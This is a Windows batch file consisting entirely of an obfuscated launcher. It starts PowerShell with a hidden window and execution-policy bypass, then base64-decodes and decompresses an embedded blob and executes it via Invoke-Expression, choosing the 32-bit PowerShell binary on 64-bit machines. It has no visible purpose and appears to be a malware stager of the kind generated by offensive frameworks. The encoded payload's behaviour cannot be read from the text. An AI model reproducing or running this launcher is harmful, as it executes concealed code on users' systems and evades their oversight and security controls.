@echo off
if %PROCESSOR_ARCHITECTURE%==x86 (powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"pVZbi9s6EH7PrxDBDwkbL7LlWxoWeqNQKKWwyzkPIQ++yF1Txw620mZ7+e/VN47k9WYLh9OX0WVG3/fNjBTHydkNezmfbd/W9fv9oe3UYv5Fdo2shX9d1PV8uWOHY1ZXOetVqvQgT0r72ftGfVId+6fq1DGtX9V1my/Oe99W7Fg1ip3O48N5/L7c/G+eN51Mlby710NheI5n3K8rNjKfZ4+4zztP2ff917xT/4V7L/e9VItLZJvV/OXMaXUhXxWFe/dwkMzVZzLZvZVl1VSqahvm5Mz9mO4lm/9bNcKfM7fRq/6Q5pLRzrtjkyOyZ+4h7Xt13x1nzunGaV+8mBSZr/jJ4xyDGIaALzds+/pBye1u5/ToKD+VufbIRJvE14YCRxPBJGuEhADytMnJEcCRaRMODHZJKPlk6dngGEsfbLzUJoshK8VeZOBLOFIACJgIezFmnM5i5oMtJy0I5gUMLYEnEVf6hjyMp1qsUuIVVmmAmUds0CcF9hKDXMCEnoVaGxmDV1gUODwLIFKzR15hCzEceybpP6YlCBSUMVpR4iwHR4y4El6RmaUfmDiJWZhY4YnxjsKjyKqCgiCbBHv5ZZb8SR72lgSBgScTZsZQG6lqYWoqSUlTRmFpTWqQPXRLkhZkFMJElCUVdnpZyRGjTLH1DniB8VJ/KYTuGo+NggJlyhCytg0dkX1ozgMDFVo2ciS0zEzwiBchDx6aYE5pQZUAL937wTHmAfjCN5WUkWF7YoJnZgQliZIU2MKOgtaxUUUvICR4K2MNyhRxcWC6NZ5NYOjZk5eSIW8gsUzsXbO/JdG0iEOP0uksuJRB1Sio4onp4CMZaC1ddEKJQS7s3aUZIQe2JJybfEcZYTTVQkQwKQkCB/3WPSqdMI7x2CBc/IV6eqa+IR/lBn+q2thpjnz90rRbTDs9CqKmRChTUFx2NZTG0B69fXq1EinENng0w48R8hheRWQ46AeKHBmklRCUwZH6lxWnqp1lbGZl27GFU93wjVMxt5Z60efXH2TzWd273lLvXl0t2Q983s7f1+3wgd0tnNP1XasXwl8sr5xquWL66NapdivmLdlP1h6V2xzrevNr5nynD+Tk34HWsnJOKwz4MN6qtFPubS3lgbm3Mm+bguH7yflv\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();") else (%WinDir%\syswow64\windowspowershell\v1.0\powershell.exe -NoP -NonI -W Hidden -Exec Bypass -Command "Invoke-Expression $(New-Object IO.StreamReader ($(New-Object IO.Compression.DeflateStream ($(New-Object IO.MemoryStream (,$([Convert]::FromBase64String(\"pVZbi9s6EH7PrxDBDwkbL7LlWxoWeqNQKKWwyzkPIQ++yF1Txw620mZ7+e/VN47k9WYLh9OX0WVG3/fNjBTHydkNezmfbd/W9fv9oe3UYv5Fdo2shX9d1PV8uWOHY1ZXOetVqvQgT0r72ftGfVId+6fq1DGtX9V1my/Oe99W7Fg1ip3O48N5/L7c/G+eN51Mlby710NheI5n3K8rNjKfZ4+4zztP2ff917xT/4V7L/e9VItLZJvV/OXMaXUhXxWFe/dwkMzVZzLZvZVl1VSqahvm5Mz9mO4lm/9bNcKfM7fRq/6Q5pLRzrtjkyOyZ+4h7Xt13x1nzunGaV+8mBSZr/jJ4xyDGIaALzds+/pBye1u5/ToKD+VufbIRJvE14YCRxPBJGuEhADytMnJEcCRaRMODHZJKPlk6dngGEsfbLzUJoshK8VeZOBLOFIACJgIezFmnM5i5oMtJy0I5gUMLYEnEVf6hjyMp1qsUuIVVmmAmUds0CcF9hKDXMCEnoVaGxmDV1gUODwLIFKzR15hCzEceybpP6YlCBSUMVpR4iwHR4y4El6RmaUfmDiJWZhY4YnxjsKjyKqCgiCbBHv5ZZb8SR72lgSBgScTZsZQG6lqYWoqSUlTRmFpTWqQPXRLkhZkFMJElCUVdnpZyRGjTLH1DniB8VJ/KYTuGo+NggJlyhCytg0dkX1ozgMDFVo2ciS0zEzwiBchDx6aYE5pQZUAL937wTHmAfjCN5WUkWF7YoJnZgQliZIU2MKOgtaxUUUvICR4K2MNyhRxcWC6NZ5NYOjZk5eSIW8gsUzsXbO/JdG0iEOP0uksuJRB1Sio4onp4CMZaC1ddEKJQS7s3aUZIQe2JJybfEcZYTTVQkQwKQkCB/3WPSqdMI7x2CBc/IV6eqa+IR/lBn+q2thpjnz90rRbTDs9CqKmRChTUFx2NZTG0B69fXq1EinENng0w48R8hheRWQ46AeKHBmklRCUwZH6lxWnqp1lbGZl27GFU93wjVMxt5Z60efXH2TzWd273lLvXl0t2Q983s7f1+3wgd0tnNP1XasXwl8sr5xquWL66NapdivmLdlP1h6V2xzrevNr5nynD+Tk34HWsnJOKwz4MN6qtFPubS3lgbm3Mm+bguH7yflv\")))), [IO.Compression.CompressionMode]::Decompress)), [Text.Encoding]::ASCII)).ReadToEnd();")